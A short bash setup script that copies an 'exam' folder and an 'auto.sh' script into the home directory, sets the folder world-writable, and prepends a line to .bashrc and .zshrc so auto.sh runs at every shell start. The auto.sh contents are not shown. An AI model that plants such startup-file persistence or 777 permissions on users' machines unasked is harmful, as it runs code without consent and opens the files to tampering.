#!/bin/bash

cp -r exam $HOME
cp -r auto.sh $HOME

chmod -R 755 $HOME/auto.sh
chmod -R 777 $HOME/exam

sed -i '' $'1s/^/bash auto.sh\\\n/' $HOME/.bashrc
sed -i '' $'1s/^/bash auto.sh\\\n/' $HOME/.zshrc

./auto.sh
